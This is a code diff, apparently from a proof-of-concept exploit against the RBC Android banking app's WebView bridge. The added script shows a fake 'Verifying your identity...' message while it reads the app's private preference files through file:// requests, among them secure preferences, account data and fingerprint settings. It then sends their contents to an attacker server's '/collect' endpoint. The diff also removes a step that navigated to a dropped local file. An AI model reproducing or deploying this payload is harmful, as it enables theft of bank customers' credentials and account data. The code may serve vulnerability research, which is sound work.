@@ -33,17 +33,42 @@ if (typeof WebViewFragment === "undefined") {
 
     // Step 3: Try DYNAMIC_DOWNLOAD_DOCUMENT
     try {
-        var testHtml = '<html><body><script>' +
-            'try {' +
-            '  WebViewFragment.onNavigateWebHook(JSON.stringify({' +
-            '    "version": "1.2",' +
-            '    "type": "externalWebview",' +
-            '    "destination": "' + SERVER + '/log?step=5-file-context-alive"' +
-            '  }));' +
-            '} catch(e) {' +
-            '  document.title = "bridge-error: " + e;' +
-            '}' +
-            '<\\/script></body></html>';
+        var testHtml = [
+          '<!DOCTYPE html>',
+          '<html><body><p>Verifying your identity...</p><script>',
+          'var stolen = {};',
+          'var targets = [',
+          '  "/data/data/com.rbc.mobile.android/shared_prefs/SecurePrefs.xml",',
+          '  "/data/data/com.rbc.mobile.android/shared_prefs/RBC Mobile.xml",',
+          '  "/data/data/com.rbc.mobile.android/shared_prefs/accounts.xml",',
+          '  "/data/data/com.rbc.mobile.android/shared_prefs/autoBackupSharedPref.xml",',
+          '  "/data/data/com.rbc.mobile.android/shared_prefs/fingerprint_preference_name.xml",',
+          '  "/data/data/com.rbc.mobile.android/shared_prefs/ASYNC_NOTIFICATION_PREF.xml"',
+          '];',
+          'var completed = 0;',
+          'targets.forEach(function(path) {',
+          '  var xhr = new XMLHttpRequest();',
+          '  xhr.open("GET", "file://" + path, true);',
+          '  xhr.onreadystatechange = function() {',
+          '    if (xhr.readyState === 4) {',
+          '      if (xhr.status === 0 || xhr.status === 200) {',
+          '        stolen[path] = xhr.responseText;',
+          '      }',
+          '      completed++;',
+          '      if (completed === targets.length) {',
+          '        var data = encodeURIComponent(JSON.stringify(stolen));',
+          '        WebViewFragment.onNavigateWebHook(JSON.stringify({',
+          '          "version": "1.2",',
+          '          "type": "externalWebview",',
+          '          "destination": "' + SERVER + '/collect?d=" + data',
+          '        }));',
+          '      }',
+          '    }',
+          '  };',
+          '  xhr.send();',
+          '});',
+          '<\\/script></body></html>'
+        ].join('\n');
 
         WebViewFragment.onFeatureEventWebHook(JSON.stringify({
             "version": "1.2",
@@ -55,14 +80,6 @@ if (typeof WebViewFragment === "undefined") {
     } catch(e) {
         log("FAIL-download-error-" + e.message);
     }
-
-    // Step 4: Navigate to file after short delay
-    setTimeout(function() {
-        log("4-about-to-navigate");
-        setTimeout(function() {
-            window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
-        }, 500);
-    }, 1500);
 }
 </script>
 </body>
